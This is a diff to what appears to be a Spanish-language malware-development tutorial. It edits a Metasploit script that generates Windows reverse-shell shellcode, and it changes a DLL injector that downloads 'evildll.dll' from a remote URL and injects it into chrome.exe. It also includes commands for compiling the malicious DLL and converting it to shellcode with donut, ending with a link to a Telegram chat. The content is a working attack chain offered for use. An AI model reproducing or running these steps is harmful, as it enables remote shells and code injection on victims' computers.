@@ -45,7 +45,7 @@ curl https://www.iconfinder.com/icons/7150904/download/ico/4096 -o venv/pornhub.
 echo """use payload/windows/x64/shell_reverse_tcp
 set LHOST 0.0.0.0
 set LPORT 0000
-generate -f raw -o venv/shellcode.bin
+generate -f c -o venv/shellcode.bin
 """ > venv/msfshellcode.rc 
 
 msfconsole -q -r venv/msfshellcode.rc
@@ -637,7 +637,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 	//char pathToDLL[] = "C:\\Users\\sciar\\Desktop\\CrashCourseMaldev\\Part2\\evildll.dll";
 	//char pathToDLL[] = "C:\\mspaintDLL.dll";
 	char pathToDLL[MAX_PATH] = "";
-	char url[] = "http://192.168.100.18:80/evildll.dll";
+	char url[] = "http://0.0.0.0:80/evildll.dll";
 	char processToInject[] = "chrome.exe";
 	int pid = 0;
 
@@ -781,11 +781,11 @@ cl.exe /O2 /D_USRDLL /D_WINDLL evildll.cpp evildll.def /MT /link /DLL /OUT:evild
 
 cl.exe /O2 /D_USRDLL /D_WINDLL evildll.cpp evildll.def /MT /link /DLL /OUT:evildll.dll
 ```
-    Esto creara los archivos dllinjector.exe and evil.dll
+    Esto creara los archivos dllinjector.exe & evil.dll
 
 - Proceso de Compilacion con [donut](https://github.com/TheWover/donut)
 ```bash
-donut -e 1 -x 1 -t evil.dll loader.bin
+donut -e 1 -x 1 -t evil.dll -o dllinjector.bin
 ```
 
 Dudas? ... Unete a la [charla](https://t.me/Ivam3by_Cinderella/22) en nuestro [Chat de Telegram](https://t.me/Ivam3by_Cinderella)
